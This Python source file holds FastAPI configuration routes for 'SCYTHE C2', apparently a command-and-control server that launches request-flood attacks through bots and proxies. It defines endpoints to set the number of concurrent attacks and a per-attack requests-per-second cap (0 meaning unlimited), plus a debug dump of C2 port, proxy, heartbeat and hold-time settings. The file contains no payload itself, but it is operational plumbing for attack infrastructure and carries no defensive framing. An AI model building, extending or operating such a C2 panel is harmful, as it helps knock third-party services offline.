"""
Configuration routes for SCYTHE C2.
- GET  /api/config/concurrent   → Get current max concurrent attacks
- POST /api/config/concurrent   → Set a new max concurrent attacks limit
- GET  /api/config/rps-limit    → Get current attack RPS limit (0 = unlimited)
- POST /api/config/rps-limit    → Set attack RPS limit
- GET  /api/config/all          → Get all configuration (debug)
"""

from fastapi import APIRouter, Request, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
from typing import Optional

from app.core.logger import logger
from app.core.redis_client import get_redis

router = APIRouter(prefix="/api/config", tags=["config"])


class ConcurrentConfigRequest(BaseModel):
    """Request model for setting max concurrent."""
    max_concurrent: int = Field(..., ge=1, le=100, description="Max concurrent attacks (1-100)")


class RpsLimitRequest(BaseModel):
    """Request model for setting attack RPS limit."""
    rps_limit: int = Field(..., ge=0, description="RPS limit per attack (0 = unlimited)")


@router.get("/concurrent")
async def get_concurrent(request: Request):
    """
    Get the current maximum concurrent attacks limit.
    """
    concurrent_manager = request.app.state.concurrent_manager
    max_val = await concurrent_manager.get_max()
    return {"max_concurrent": max_val}


@router.post("/concurrent")
async def set_concurrent(request: Request, config_req: ConcurrentConfigRequest):
    """
    Set a new maximum concurrent attacks limit.
    The value must be between 1 and 100.
    FIX: If value is less than active attacks, auto-correct to active_count + 1 instead of blocking.
    """
    concurrent_manager = request.app.state.concurrent_manager
    attack_manager = request.app.state.attack_manager

    active_count = len(attack_manager.active_attacks)
    target_value = config_req.max_concurrent

    # FIX: Auto-correct instead of blocking
    if target_value < active_count:
        corrected_value = active_count + 1
        logger.warning(
            f"Requested max_concurrent {target_value} is less than active attacks {active_count}. "
            f"Auto-correcting to {corrected_value}."
        )
        target_value = corrected_value

    success = await concurrent_manager.set_max(target_value)
    if not success:
        raise HTTPException(status_code=500, detail="Failed to set max concurrent")

    logger.info(f"Max concurrent updated to {target_value} (active attacks: {active_count})")
    return JSONResponse(content={
        "success": True,
        "message": f"Max concurrent set to {target_value}",
        "max_concurrent": target_value,
        "auto_corrected": target_value != config_req.max_concurrent,
        "active_attacks": active_count
    })


# ===================== RPS LIMIT ENDPOINTS =====================

@router.get("/rps-limit")
async def get_rps_limit(request: Request):
    """
    Get the current attack RPS limit (0 = unlimited).
    """
    redis = await get_redis()
    value = await redis.get("scythe:config:attack_rps_limit")
    if value is None:
        from app.core.config import settings
        return {"rps_limit": settings.ATTACK_RPS_LIMIT}
    return {"rps_limit": int(value)}


@router.post("/rps-limit")
async def set_rps_limit(request: Request, payload: RpsLimitRequest):
    """
    Set the global attack RPS limit.
    Value must be >= 0 (0 means unlimited).
    This limit will apply to all new attacks (direct & bot).
    """
    redis = await get_redis()
    await redis.set("scythe:config:attack_rps_limit", str(payload.rps_limit))
    logger.info(f"Attack RPS limit set to {payload.rps_limit}")
    return JSONResponse(content={
        "success": True,
        "message": f"RPS limit set to {payload.rps_limit}",
        "rps_limit": payload.rps_limit
    })


# ===================== ALL CONFIG =====================

@router.get("/all")
async def get_all_config(request: Request):
    """
    Get all configuration values (for debugging/admin).
    Includes max_concurrent, proxy refresh interval, log level, etc.
    """
    concurrent_manager = request.app.state.concurrent_manager
    max_concurrent = await concurrent_manager.get_max()

    from app.core.config import settings
    redis = await get_redis()
    rps_limit = await redis.get("scythe:config:attack_rps_limit")
    if rps_limit is None:
        rps_limit = settings.ATTACK_RPS_LIMIT
    else:
        rps_limit = int(rps_limit)

    return {
        "max_concurrent": max_concurrent,
        "api_port": settings.API_PORT,
        "c2_port": settings.C2_PORT,
        "redis_url": settings.REDIS_URL,
        "history_db": settings.HISTORY_DB,
        "log_level": settings.LOG_LEVEL,
        "proxy_refresh_interval": settings.PROXY_REFRESH_INTERVAL,
        "proxy_health_timeout": settings.PROXY_HEALTH_TIMEOUT,
        "heartbeat_interval": settings.HEARTBEAT_INTERVAL,
        "max_hold_time": settings.MAX_HOLD_TIME,
        "attack_rps_limit": rps_limit,
    }
